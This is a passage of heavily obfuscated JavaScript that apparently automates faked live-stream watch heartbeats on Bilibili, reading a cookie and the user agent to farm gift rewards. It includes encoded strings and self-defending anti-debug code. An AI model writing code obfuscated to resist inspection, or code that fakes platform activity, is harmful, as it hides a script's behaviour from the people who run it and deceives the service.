x71\x48\x44\x70\x6e\x2f\x43\x71\x46\x30\x3d','\x49\x41\x33\x44\x67\x51\x54\x43\x72\x67\x3d\x3d','\x77\x36\x6c\x2b\x77\x36\x6a\x43\x69\x32\x6a\x43\x6d\x67\x3d\x3d','\x77\x35\x70\x72\x48\x58\x52\x4c','\x77\x6f\x72\x44\x72\x46\x2f\x44\x76\x38\x4b\x31\x64\x41\x3d\x3d','\x54\x63\x4f\x42\x43\x52\x41\x44','\x47\x73\x4f\x6f\x56\x48\x42\x6c','\x61\x7a\x30\x73\x77\x72\x66\x44\x74\x41\x3d\x3d','\x4f\x38\x4b\x5a\x77\x34\x2f\x43\x69\x51\x6f\x3d','\x77\x36\x33\x43\x76\x73\x4b\x70\x57\x4d\x4f\x66','\x57\x6e\x5a\x78\x77\x72\x6e\x44\x76\x4d\x4f\x55\x77\x36\x64\x74\x77\x70\x50\x43\x6f\x52\x49\x6c','\x47\x38\x4f\x65\x64\x6e\x39\x48','\x51\x4d\x4b\x2f\x77\x35\x7a\x44\x76\x58\x41\x57\x77\x34\x6f\x6f\x49\x7a\x44\x43\x67\x73\x4b\x59\x77\x36\x56\x2b','\x77\x71\x33\x44\x76\x43\x76\x44\x73\x63\x4b\x30\x77\x70\x67\x52\x63\x63\x4f\x65\x56\x52\x62\x43\x76\x38\x4f\x64','\x50\x6a\x6f\x44\x77\x36\x67\x44\x53\x4d\x4b\x4f\x77\x6f\x45\x32\x77\x35\x72\x43\x75\x56\x70\x79\x5a\x41\x3d\x3d','\x56\x79\x6f\x67\x77\x71\x54\x44\x71\x55\x46\x46\x77\x70\x58\x43\x71\x63\x4f\x49\x77\x34\x67\x45\x77\x37\x31\x4f\x77\x72\x37\x43\x68\x6e\x58\x44\x75\x67\x3d\x3d','\x66\x63\x4b\x35\x41\x63\x4f\x63\x48\x63\x4f\x63\x77\x36\x4d\x68\x77\x72\x54\x44\x73\x73\x4b\x6a\x43\x55\x49\x3d','\x62\x67\x6e\x44\x76\x4d\x4b\x4f\x77\x36\x67\x6e\x77\x35\x59\x2b\x77\x36\x2f\x43\x73\x63\x4b\x56\x77\x36\x48\x44\x67\x73\x4b\x42','\x44\x38\x4b\x71\x77\x71\x74\x43\x45\x6a\x4a\x78\x77\x34\x54\x43\x6c\x73\x4b\x47\x77\x72\x77\x63\x77\x36\x37\x43\x74\x4d\x4b\x2b\x77\x70\x4d\x66\x77\x71\x62\x44\x67\x63\x4f\x67\x4b\x47\x6b\x3d','\x57\x6d\x46\x51\x77\x35\x48\x44\x67\x63\x4f\x68\x42\x38\x4b\x79\x42\x73\x4f\x32\x47\x4d\x4b\x4f\x77\x70\x38\x58','\x77\x70\x35\x49\x57\x51\x48\x43\x6a\x38\x4f\x35\x58\x38\x4f\x54\x42\x33\x34\x3d','\x77\x6f\x50\x43\x6d\x38\x4b\x55\x77\x37\x55\x72\x4e\x67\x66\x43\x67\x38\x4f\x64\x77\x70\x2f\x44\x73\x31\x35\x6f\x49\x56\x4e\x69\x46\x42\x76\x44\x6a\x41\x3d\x3d','\x77\x35\x31\x70\x44\x43\x76\x43\x72\x4d\x4f\x6f\x77\x36\x31\x73\x58\x4d\x4b\x69\x77\x36\x78\x4c\x43\x73\x4f\x4a\x77\x35\x73\x50\x77\x34\x59\x3d','\x77\x34\x4c\x44\x6a\x38\x4f\x66\x63\x78\x51\x38\x77\x34\x58\x44\x70\x30\x67\x45\x4c\x31\x51\x4b\x77\x34\x6a\x44\x76\x63\x4b\x57\x77\x70\x63\x43\x77\x37\x48\x44\x74\x68\x44\x43\x6a\x67\x3d\x3d','\x41\x4d\x4b\x48\x77\x34\x31\x37\x77\x36\x67\x3d','\x77\x71\x72\x44\x71\x47\x72\x43\x73\x6b\x72\x44\x6d\x67\x64\x4a\x77\x6f\x72\x43\x6c\x6a\x6e\x43\x69\x38\x4b\x55\x77\x34\x6b\x6d\x45\x38\x4b\x4c\x77\x37\x77\x3d','\x77\x35\x72\x43\x74\x6a\x37\x43\x75\x31\x72\x43\x67\x31\x6e\x44\x75\x73\x4b\x38\x65\x6b\x4c\x43\x6b\x46\x6f\x79','\x77\x34\x68\x66\x77\x37\x62\x43\x72\x31\x4c\x44\x76\x63\x4b\x4a\x77\x6f\x45\x31\x44\x73\x4f\x2b\x42\x56\x73\x3d','\x77\x37\x76\x43\x68\x78\x7a\x43\x73\x32\x76\x43\x72\x6c\x6e\x44\x67\x38\x4b\x4b\x62\x48\x6e\x43\x73\x48\x34\x6f\x77\x6f\x6e\x43\x6a\x63\x4f\x2f\x77\x37\x38\x6d\x77\x6f\x44\x44\x74\x6c\x38\x3d','\x77\x72\x46\x61\x63\x44\x50\x43\x6f\x67\x3d\x3d','\x77\x71\x2f\x44\x72\x55\x62\x43\x73\x6e\x72\x44\x74\x78\x42\x4b\x77\x6f\x58\x43\x6b\x51\x3d\x3d','\x77\x34\x5a\x30\x46\x32\x4e\x50','\x57\x43\x33\x44\x73\x4d\x4b\x72\x77\x36\x63\x3d','\x57\x7a\x34\x33\x77\x71\x4c\x44\x6a\x41\x3d\x3d','\x45\x38\x4b\x56\x77\x71\x68\x52\x43\x51\x3d\x3d','\x77\x6f\x42\x47\x4a\x6a\x33\x44\x6f\x67\x3d\x3d','\x48\x77\x38\x70\x77\x35\x73\x70\x5a\x77\x3d\x3d','\x65\x77\x66\x44\x6d\x63\x4b\x56\x77\x36\x67\x3d','\x4b\x44\x31\x45\x77\x35\x4a\x32','\x4c\x6a\x6a\x44\x75\x51\x37\x43\x6f\x41\x3d\x3d','\x47\x63\x4b\x76\x77\x36\x37\x43\x67\x44\x30\x3d','\x50\x32\x59\x32\x63\x63\x4f\x66','\x77\x37\x54\x43\x72\x77\x34\x3d','\x77\x70\x4e\x4b\x57\x77\x44\x43\x75\x63\x4f\x35\x58\x38\x4f\x71\x42\x47\x6e\x43\x75\x79\x78\x4f\x62\x57\x77\x55\x44\x63\x4f\x72\x42\x4d\x4f\x41','\x77\x34\x48\x43\x67\x63\x4f\x67\x77\x37\x4c\x43\x75\x67\x3d\x3d','\x77\x71\x4e\x67\x55\x77\x7a\x44\x73\x41\x3d\x3d','\x4f\x6d\x51\x6d\x58\x63\x4f\x30','\x77\x37\x37\x43\x75\x38\x4f\x4f\x77\x34\x72\x43\x73\x77\x3d\x3d','\x77\x37\x78\x32\x77\x70\x2f\x44\x72\x4d\x4f\x6f','\x53\x73\x4f\x42\x4e\x69\x38\x4b','\x77\x70\x44\x44\x6d\x48\x48\x43\x6b\x57\x44\x44\x68\x79\x70\x38\x77\x72\x37\x43\x76\x41\x44\x43\x76\x38\x4b\x75\x77\x37\x67\x3d','\x61\x63\x4f\x44\x41\x42\x59\x32\x64\x78\x5a\x4c\x77\x71\x5a\x32\x77\x36\x72\x44\x72\x38\x4f\x34','\x77\x71\x54\x43\x6d\x51\x66\x44\x73\x63\x4b\x72','\x66\x4d\x4b\x37\x4d\x4d\x4f\x68\x49\x77\x3d\x3d','\x77\x35\x33\x43\x72\x41\x68\x50\x77\x37\x6b\x3d','\x77\x36\x4a\x45\x77\x6f\x76\x44\x73\x38\x4f\x68','\x4b\x4d\x4b\x64\x51\x38\x4b\x62\x54\x41\x3d\x3d','\x77\x70\x64\x6c\x77\x71\x4d\x70\x57\x67\x3d\x3d','\x77\x37\x6a\x43\x76\x67\x42\x46\x77\x70\x77\x3d','\x77\x72\x31\x4d\x49\x7a\x66\x44\x6a\x67\x3d\x3d','\x77\x35\x72\x43\x71\x42\x66\x43\x6f\x45\x6b\x3d','\x77\x34\x72\x43\x71\x7a\x64\x74\x77\x36\x77\x3d','\x58\x44\x48\x44\x67\x73\x4b\x32\x77\x36\x4d\x3d','\x4a\x54\x52\x55\x77\x72\x56\x73','\x4d\x73\x4f\x4f\x5a\x67\x37\x43\x68\x51\x3d\x3d','\x4a\x69\x76\x44\x75\x69\x44\x43\x6f\x38\x4f\x79','\x77\x71\x6e\x44\x6e\x69\x4c\x44\x70\x4d\x4b\x33','\x49\x73\x4b\x46\x53\x63\x4b\x49\x61\x51\x3d\x3d','\x77\x36\x52\x34\x77\x35\x48\x43\x72\x30\x30\x3d','\x4b\x41\x56\x33\x77\x71\x42\x63','\x77\x72\x4a\x6a\x4e\x67\x3d\x3d','\x77\x34\x34\x71\x44\x68\x50\x44\x6f\x48\x74\x59\x77\x34\x6e\x44\x71\x38\x4b\x47\x47\x56\x37\x44\x6c\x42\x66\x44\x72\x38\x4f\x30\x42\x69\x49\x3d','\x57\x4d\x4f\x38\x41\x45\x78\x79','\x77\x37\x74\x52\x77\x71\x6a\x44\x71\x63\x4f\x4c','\x77\x70\x6f\x75\x77\x70\x6f\x70\x77\x72\x6f\x3d','\x77\x37\x4a\x76\x77\x36\x33\x43\x6a\x48\x6a\x44\x6f\x4d\x4b\x6b\x77\x72\x51\x42\x47\x4d\x4f\x46\x4a\x58\x2f\x44\x76\x51\x3d\x3d','\x77\x35\x46\x47\x77\x71\x62\x44\x69\x63\x4f\x39\x77\x72\x34\x55\x77\x71\x34\x50\x77\x6f\x37\x44\x76\x46\x66\x44\x75\x46\x6b\x71\x53\x58\x59\x6c\x4c\x51\x3d\x3d','\x77\x34\x68\x66\x77\x37\x62\x43\x72\x31\x4c\x44\x76\x63\x4b\x4a\x77\x6f\x45\x31\x4d\x73\x4f\x38\x45\x55\x58\x44\x6a\x42\x7a\x43\x6c\x32\x38\x31','\x4e\x38\x4f\x6a\x77\x70\x62\x44\x6b\x43\x56\x78\x57\x73\x4b\x63\x62\x73\x4b\x68\x77\x6f\x66\x43\x6d\x79\x72\x44\x6a\x77\x3d\x3d','\x43\x73\x4b\x50\x77\x37\x2f\x43\x6e\x42\x33\x43\x69\x63\x4f\x53\x77\x35\x64\x74\x65\x38\x4f\x49\x77\x70\x59\x4e\x62\x45\x72\x43\x6e\x54\x33\x43\x68\x77\x3d\x3d','\x77\x36\x4e\x46\x77\x35\x58\x44\x67\x4d\x4f\x4d','\x77\x37\x33\x43\x73\x78\x52\x36\x77\x71\x63\x3d','\x59\x30\x31\x67\x77\x37\x2f\x44\x74\x77\x3d\x3d','\x77\x36\x4c\x43\x76\x63\x4b\x6e\x5a\x4d\x4f\x6a','\x77\x35\x48\x43\x71\x6e\x74\x53\x77\x71\x51\x3d','\x48\x33\x30\x6a\x62\x73\x4f\x31','\x45\x73\x4f\x34\x64\x54\x66\x43\x6a\x67\x3d\x3d','\x53\x31\x68\x57\x77\x37\x37\x44\x67\x67\x3d\x3d','\x77\x34\x72\x43\x75\x6a\x39\x5a\x77\x36\x30\x3d','\x48\x38\x4b\x62\x77\x35\x56\x42\x77\x34\x51\x3d','\x44\x38\x4f\x62\x61\x68\x6e\x43\x73\x51\x3d\x3d','\x42\x7a\x56\x33','\x6a\x73\x57\x55\x47\x6a\x68\x69\x4b\x67\x52\x61\x72\x6d\x69\x68\x45\x2e\x74\x72\x63\x6f\x48\x6d\x2e\x76\x36\x3d\x3d'];(function(_0x5607af,_0x13e9cb,_0x1e931d){var _0x28a583=function(_0x3137ff,_0x52f707,_0x238939,_0x32db0f,_0x179cb7){_0x52f707=_0x52f707>>0x8,_0x179cb7='po';var _0x146e53='shift',_0x5c6f2e='push';if(_0x52f707<_0x3137ff){while(--_0x3137ff){_0x32db0f=_0x5607af[_0x146e53]();if(_0x52f707===_0x3137ff){_0x52f707=_0x32db0f;_0x238939=_0x5607af[_0x179cb7+'p']();}else if(_0x52f707&&_0x238939['replace'](/[WUGhKgRrhEtrH=]/g,'')===_0x52f707){_0x5607af[_0x5c6f2e](_0x32db0f);}}_0x5607af[_0x5c6f2e](_0x5607af[_0x146e53]());}return 0x40344;};var _0x4e5326=function(){var _0x329c28={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x555db0,_0x2e1512,_0x521610,_0x24dd49){_0x24dd49=_0x24dd49||{};var _0x345f29=_0x2e1512+'='+_0x521610;var _0x5c41e6=0x0;for(var _0x5c41e6=0x0,_0x3c1095=_0x555db0['length'];_0x5c41e6<_0x3c1095;_0x5c41e6++){var _0x8e708c=_0x555db0[_0x5c41e6];_0x345f29+=';\x20'+_0x8e708c;var _0x49c33c=_0x555db0[_0x8e708c];_0x555db0['push'](_0x49c33c);_0x3c1095=_0x555db0['length'];if(_0x49c33c!==!![]){_0x345f29+='='+_0x49c33c;}}_0x24dd49['cookie']=_0x345f29;},'removeCookie':function(){return'dev';},'getCookie':function(_0x29aaee,_0x10f7de){_0x29aaee=_0x29aaee||function(_0x25fce9){return _0x25fce9;};var _0xcf52e7=_0x29aaee(new RegExp('(?:^|;\x20)'+_0x10f7de['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x47c4c5=typeof _0xodm=='undefined'?'undefined':_0xodm,_0x56be0e=_0x47c4c5['split'](''),_0x571aab=_0x56be0e['length'],_0x1c724e=_0x571aab-0xe,_0x54a285;while(_0x54a285=_0x56be0e['pop']()){_0x571aab&&(_0x1c724e+=_0x54a285['charCodeAt']());}var _0x4e3f6b=function(_0x188fdd,_0x496f04,_0x503e1c){_0x188fdd(++_0x496f04,_0x503e1c);};_0x1c724e^-_0x571aab===-0x524&&(_0x54a285=_0x1c724e)&&_0x4e3f6b(_0x28a583,_0x13e9cb,_0x1e931d);return _0x54a285>>0x2===0x14b&&_0xcf52e7?decodeURIComponent(_0xcf52e7[0x1]):undefined;}};var _0x497ae4=function(){var _0xc1da59=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0xc1da59['test'](_0x329c28['removeCookie']['toString']());};_0x329c28['updateCookie']=_0x497ae4;var _0x225cda='';var _0x5438b0=_0x329c28['updateCookie']();if(!_0x5438b0){_0x329c28['setCookie'](['*'],'counter',0x1);}else if(_0x5438b0){_0x225cda=_0x329c28['getCookie'](null,'counter');}else{_0x329c28['removeCookie']();}};_0x4e5326();}(_0x2cf9,0x185,0x18500));var _0x5108=function(_0x25ddf8,_0x3ae270){_0x25ddf8=~~'0x'['concat'](_0x25ddf8);var _0x323253=_0x2cf9[_0x25ddf8];if(_0x5108['mjiYIr']===undefined){(function(){var _0x26d64a=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x5991e0='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x26d64a['atob']||(_0x26d64a['atob']=function(_0x496906){var _0x4a7b0b=String(_0x496906)['replace'](/=+$/,'');for(var _0x3b2156=0x0,_0x2c7169,_0x5ba7c6,_0x4fdb1f=0x0,_0x5d05df='';_0x5ba7c6=_0x4a7b0b['charAt'](_0x4fdb1f++);~_0x5ba7c6&&(_0x2c7169=_0x3b2156%0x4?_0x2c7169*0x40+_0x5ba7c6:_0x5ba7c6,_0x3b2156++%0x4)?_0x5d05df+=String['fromCharCode'](0xff&_0x2c7169>>(-0x2*_0x3b2156&0x6)):0x0){_0x5ba7c6=_0x5991e0['indexOf'](_0x5ba7c6);}return _0x5d05df;});}());var _0x580b60=function(_0x1ef8b6,_0x3ae270){var _0xc2a138=[],_0x212545=0x0,_0xc5353d,_0x3bce52='',_0x234364='';_0x1ef8b6=atob(_0x1ef8b6);for(var _0x55ee60=0x0,_0x1362d0=_0x1ef8b6['length'];_0x55ee60<_0x1362d0;_0x55ee60++){_0x234364+='%'+('00'+_0x1ef8b6['charCodeAt'](_0x55ee60)['toString'](0x10))['slice'](-0x2);}_0x1ef8b6=decodeURIComponent(_0x234364);for(var _0x166334=0x0;_0x166334<0x100;_0x166334++){_0xc2a138[_0x166334]=_0x166334;}for(_0x166334=0x0;_0x166334<0x100;_0x166334++){_0x212545=(_0x212545+_0xc2a138[_0x166334]+_0x3ae270['charCodeAt'](_0x166334%_0x3ae270['length']))%0x100;_0xc5353d=_0xc2a138[_0x166334];_0xc2a138[_0x166334]=_0xc2a138[_0x212545];_0xc2a138[_0x212545]=_0xc5353d;}_0x166334=0x0;_0x212545=0x0;for(var _0x25819e=0x0;_0x25819e<_0x1ef8b6['length'];_0x25819e++){_0x166334=(_0x166334+0x1)%0x100;_0x212545=(_0x212545+_0xc2a138[_0x166334])%0x100;_0xc5353d=_0xc2a138[_0x166334];_0xc2a138[_0x166334]=_0xc2a138[_0x212545];_0xc2a138[_0x212545]=_0xc5353d;_0x3bce52+=String['fromCharCode'](_0x1ef8b6['charCodeAt'](_0x25819e)^_0xc2a138[(_0xc2a138[_0x166334]+_0xc2a138[_0x212545])%0x100]);}return _0x3bce52;};_0x5108['Kvwicf']=_0x580b60;_0x5108['zOfXaI']={};_0x5108['mjiYIr']=!![];}var _0x436238=_0x5108['zOfXaI'][_0x25ddf8];if(_0x436238===undefined){if(_0x5108['KXJBPe']===undefined){var _0x51b834=function(_0x2ec2e4){this['ChhGVe']=_0x2ec2e4;this['wgZGQO']=[0x1,0x0,0x0];this['kWGulA']=function(){return'newState';};this['IpuNCj']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['QBOiiF']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x51b834['prototype']['dBXheL']=function(){var _0x26e90e=new RegExp(this['IpuNCj']+this['QBOiiF']);var _0x560477=_0x26e90e['test'](this['kWGulA']['toString']())?--this['wgZGQO'][0x1]:--this['wgZGQO'][0x0];return this['zVVfbT'](_0x560477);};_0x51b834['prototype']['zVVfbT']=function(_0x7eb04a){if(!Boolean(~_0x7eb04a)){return _0x7eb04a;}return this['EYPaxX'](this['ChhGVe']);};_0x51b834['prototype']['EYPaxX']=function(_0x4ce90e){for(var _0x5f2b7a=0x0,_0x205ad8=this['wgZGQO']['length'];_0x5f2b7a<_0x205ad8;_0x5f2b7a++){this['wgZGQO']['push'](Math['round'](Math['random']()));_0x205ad8=this['wgZGQO']['length'];}return _0x4ce90e(this['wgZGQO'][0x0]);};new _0x51b834(_0x5108)['dBXheL']();_0x5108['KXJBPe']=!![];}_0x323253=_0x5108['Kvwicf'](_0x323253,_0x3ae270);_0x5108['zOfXaI'][_0x25ddf8]=_0x323253;}else{_0x323253=_0x436238;}return _0x323253;};var _0x264d67=function(){var _0x556cad=!![];return function(_0x190e7f,_0x27b6e2){var _0x4d9361=_0x556cad?function(){if(_0x27b6e2){var _0x2d9af6=_0x27b6e2['apply'](_0x190e7f,arguments);_0x27b6e2=null;return _0x2d9af6;}}:function(){};_0x556cad=![];return _0x4d9361;};}();var _0x3c1842=_0x264d67(this,function(){var _0x516d65=function(){return'\x64\x65\x76';},_0x59cc06=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x42ade7=function(){var _0x4bfbfe=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x4bfbfe['\x74\x65\x73\x74'](_0x516d65['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x2bf99b=function(){var _0x3b7aad=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x3b7aad['\x74\x65\x73\x74'](_0x59cc06['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x28733c=function(_0x5b1bfd){var _0x22003b=~-0x1>>0x1+0xff%0x0;if(_0x5b1bfd['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x22003b)){_0x447fb4(_0x5b1bfd);}};var _0x447fb4=function(_0x570226){var _0x169565=~-0x4>>0x1+0xff%0x0;if(_0x570226['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x169565){_0x28733c(_0x570226);}};if(!_0x42ade7()){if(!_0x2bf99b()){_0x28733c('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x28733c('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x28733c('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x3c1842();const UUID=()=>_0x5108('0','\x38\x5a\x44\x72')[_0x5108('1','\x55\x76\x76\x40')](/[xy]/g,function(_0x5ece9b){var _0x29f4d5={'\x6b\x50\x4f\x4e\x52':function(_0x12c68e,_0x13e880){return _0x12c68e|_0x13e880;},'\x41\x42\x64\x66\x45':function(_0x49264f,_0x212ac1){return _0x49264f*_0x212ac1;},'\x62\x55\x50\x6f\x49':function(_0x49d65b,_0x1d07a6){return _0x49d65b===_0x1d07a6;},'\x4e\x64\x69\x4e\x6a':function(_0x33171b,_0x403e28){return _0x33171b|_0x403e28;},'\x6b\x4d\x4e\x49\x55':function(_0x5060b6,_0x13cb1a){return _0x5060b6&_0x13cb1a;}};var _0x2dd70d=_0x29f4d5['\x6b\x50\x4f\x4e\x52'](_0x29f4d5['\x41\x42\x64\x66\x45'](0x10,Math['\x72\x61\x6e\x64\x6f\x6d']()),0x0);return(_0x29f4d5[_0x5108('2','\x6e\x58\x40\x76')]('\x78',_0x5ece9b)?_0x2dd70d:_0x29f4d5['\x4e\x64\x69\x4e\x6a'](_0x29f4d5[_0x5108('3','\x6d\x4d\x28\x24')](0x3,_0x2dd70d),0x8))[_0x5108('4','\x33\x57\x49\x6c')](0x10);});class HeartGiftRoom{constructor(_0x18a821){var _0x530d65={'\x65\x6b\x78\x4f\x73':'\x32\x7c\x38\x7c\x34\x7c\x37\x7c\x39\x7c\x31\x7c\x35\x7c\x31\x30\x7c\x30\x7c\x33\x7c\x31\x31\x7c\x36','\x51\x43\x67\x58\x4e':function(_0x414611,_0x14aa03){return _0x414611(_0x14aa03);},'\x4c\x78\x77\x4c\x58':_0x5108('5','\x74\x52\x75\x55'),'\x75\x71\x64\x64\x7a':function(_0x30a2e7){return _0x30a2e7();}};var _0x35efc0=_0x530d65[_0x5108('6','\x33\x30\x51\x53')]['\x73\x70\x6c\x69\x74']('\x7c'),_0x274f22=0x0;while(!![]){switch(_0x35efc0[_0x274f22++]){case'\x30':this['\x75\x61']=window&&window['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']?window['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']:'';continue;case'\x31':this[_0x5108('7','\x69\x5d\x67\x54')]=_0x18a821[_0x5108('8','\x28\x21\x50\x46')];continue;case'\x32':this[_0x5108('9','\x55\x76\x76\x40')]=_0x18a821;continue;case'\x33':this['\x6c\x61\x73\x74\x5f\x74\x69\x6d\x65']=new Date();continue;case'\x34':this[_0x5108('a','\x75\x44\x74\x4c')]=_0x18a821[_0x5108('b','\x62\x64\x5a\x41')];continue;case'\x35':this[_0x5108('c','\x6a\x6e\x6c\x26')]=_0x530d65['\x51\x43\x67\x58\x4e'](getCookie,_0x530d65[_0x5108('d','\x33\x30\x51\x53')]);continue;case'\x36':this['\x65\x72\x72\x6f\x72']=0x0;continue;case'\x37':;continue;case'\x38':this['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64']=_0x18a821[_0x5108('e','\x6a\x48\x31\x54')];continue;case'\x39':this['\x73\x65\x71']=0x0;continue;case'\x31\x30':this[_0x5108('f','\x6d\x4d\x28\x24')]=_0x530d65[_0x5108('10','\x55\x57\x6c\x64')](UUID);continue;case'\x31\x31':this[_0x5108('11','\x55\x57\x6c\x64')]();continue;}break;}}async[_0x5108('12','\x74\x53\x45\x39')](){var _0x1a09d2={'\x79\x58\x51\x6f\x72':function(_0x38f53f,_0x266142){return _0x38f53f>_0x266142;},'\x54\x67\x58\x72\x79':function(_0x36dd2b,_0x176c8a){return _0x36dd2b==_0x176c8a;},'\x67\x53\x76\x46\x44':_0x5108('13','\x4d\x77\x79\x66'),'\x50\x78\x51\x51\x59':function(_0xb586d1,_0x3444f4,_0x16dfad){return _0xb586d1(_0x3444f4,_0x16dfad);},'\x68\x53\x68\x55\x78':function(_0x253bfa,_0x480457){return _0x253bfa*_0x480457;}};try{if(!HeartGift[_0x5108('14','\x64\x21\x66\x62')]||_0x1a09d2[_0x5108('15','\x5b\x2a\x32\x53')](this[_0x5108('16','\x74\x53\x45\x39')],0x3))return;let _0x6d246b={'\x69\x64':[this[_0x5108('e','\x6a\x48\x31\x54')],this['\x61\x72\x65\x61\x5f\x69\x64'],this['\x73\x65\x71'],this['\x72\x6f\x6f\x6d\x5f\x69\x64']],'\x64\x65\x76\x69\x63\x65':[this[_0x5108('17','\x4a\x45\x51\x38')],this[_0x5108('18','\x36\x72\x6a\x65')]],'\x74\x73':new Date()['\x67\x65\x74\x54\x69\x6d\x65'](),'\x69\x73\x5f\x70\x61\x74\x63\x68':0x0,'\x68\x65\x61\x72\x74\x5f\x62\x65\x61\x74':[],'\x75\x61':this['\x75\x61']};KeySign[_0x5108('19','\x2a\x37\x2a\x30')](_0x6d246b);let _0xe25464=await BiliPushUtils['\x41\x50\x49'][_0x5108('1a','\x75\x44\x74\x4c')][_0x5108('1b','\x70\x74\x30\x63')](_0x6d246b);if(_0x1a09d2[_0x5108('1c','\x58\x35\x38\x4b')](_0xe25464[_0x5108('1d','\x4a\x45\x51\x38')],0x0)){var _0x27e1e6=_0x1a09d2[_0x5108('1e','\x61\x4d\x26\x71')][_0x5108('1f','\x77\x63\x31\x42')]('\x7c'),_0x13f105=0x0;while(!![]){switch(_0x27e1e6[_0x13f105++]){case'\x30':this[_0x5108('20','\x70\x74\x30\x63')]=_0xe25464[_0x5108('21','\x44\x75\x68\x6c')][_0x5108('22','\x5b\x2a\x32\x53')];continue;case'\x31':this[_0x5108('23','\x4a\x45\x51\x38')]=_0xe25464[_0x5108('24','\x73\x6d\x6a\x5e')][_0x5108('25','\x61\x4d\x26\x71')];continue;case'\x32':++this[_0x5108('26','\x5b\x2a\x32\x53')];continue;case'\x33':this['\x74\x69\x6d\x65']=_0xe25464[_0x5108('27','\x4c\x58\x2a\x77')]['\x68\x65\x61\x72\x74\x62\x65\x61\x74\x5f\x69\x6e\x74\x65\x72\x76\x61\x6c'];continue;case'\x34':this[_0x5108('28','\x74\x52\x75\x55')]=_0xe25464['\x64\x61\x74\x61'][_0x5108('29','\x44\x69\x79\x38')];continue;}break;}}await _0x1a09d2[_0x5108('2a','\x48\x78\x51\x64')](delayCall,()=>this['\x68\x65\x61\x72\x74\x50\x72\x6f\x63\x65\x73\x73'](),_0x1a09d2[_0x5108('2b','\x73\x6d\x6a\x5e')](this['\x74\x69\x6d\x65'],0x3e8));}catch(_0x1bbe79){this[_0x5108('2c','\x52\x47\x5d\x35')]++;console['\x65\x72\x72\x6f\x72'](_0x1bbe79);await _0x1a09d2['\x50\x78\x51\x51\x59'](delayCall,()=>this[_0x5108('2d','\x62\x64\x5a\x41')](),0x3e8);}}async[_0x5108('2e','\x29\x4c\x5e\x56')](){var _0x4043d2={'\x53\x6c\x6c\x44\x51':function(_0x41221b,_0x1c20ff){return _0x41221b+_0x1c20ff;},'\x77\x6f\x4d\x6d\x6c':function(_0x39e9e5,_0x2c4e1d){return _0x39e9e5/_0x2c4e1d;},'\x6c\x45\x59\x6f\x4b':function(_0x268f3e,_0x5b1d0c){return _0x268f3e!==_0x5b1d0c;},'\x74\x44\x4d\x68\x6f':_0x5108('2f','\x36\x72\x6a\x65'),'\x78\x63\x49\x62\x6c':_0x5108('30','\x7a\x45\x7a\x7a'),'\x4f\x6e\x55\x6a\x69':function(_0x321d18,_0x3dd012){return _0x321d18>_0x3dd012;},'\x70\x57\x4a\x64\x48':function(_0x35dce8,_0x463ea7){return _0x35dce8==_0x463ea7;},'\x76\x51\x4d\x56\x59':function(_0xa671a3,_0x411f1f){return _0xa671a3<=_0x411f1f;},'\x61\x54\x76\x68\x71':function(_0x20f81c,_0x4f527d,_0x230720){return _0x20f81c(_0x4f527d,_0x230720);},'\x5a\x71\x7a\x64\x49':function(_0x11b6d8,_0x2b93f9){return _0x11b6d8*_0x2b93f9;},'\x72\x55\x68\x5a\x56':function(_0x14532a,_0x2f8b7f){return _0x14532a===_0x2f8b7f;},'\x66\x79\x54\x46\x6a':_0x5108('31','\x36\x72\x6a\x65'),'\x47\x79\x41\x45\x54':_0x5108('32','\x78\x77\x74\x61'),'\x5a\x52\x67\x4f\x71':function(_0x152ed8,_0x13a5d4){return _0x152ed8(_0x13a5d4);}};try{if(_0x4043d2[_0x5108('33','\x36\x72\x6a\x65')](_0x4043d2['\x74\x44\x4d\x68\x6f'],_0x4043d2['\x78\x63\x49\x62\x6c'])){if(!HeartGift[_0x5108('34','\x75\x44\x74\x4c')]||_0x4043d2['\x4f\x6e\x55\x6a\x69'](this[_0x5108('35','\x61\x4d\x26\x71')],0x3))return;let _0x504dda={'\x69\x64':[this['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64'],this[_0x5108('36','\x36\x72\x6a\x65')],this['\x73\x65\x71'],this[_0x5108('37','\x52\x68\x75\x5e')]],'\x64\x65\x76\x69\x63\x65':[this[_0x5108('38','\x52\x68\x75\x5e')],this[_0x5108('39','\x29\x63\x52\x35')]],'\x65\x74\x73':this[_0x5108('3a','\x65\x71\x58\x4e')],'\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b':this[_0x5108('3b','\x6d\x4d\x28\x24')],'\x74\x69\x6d\x65':this[_0x5108('3c','\x74\x53\x45\x39')],'\x74\x73':new Date()['\x67\x65\x74\x54\x69\x6d\x65'](),'\x75\x61':this['\x75\x61']};KeySign['\x63\x6f\x6e\x76\x65\x72\x74'](_0x504dda);let 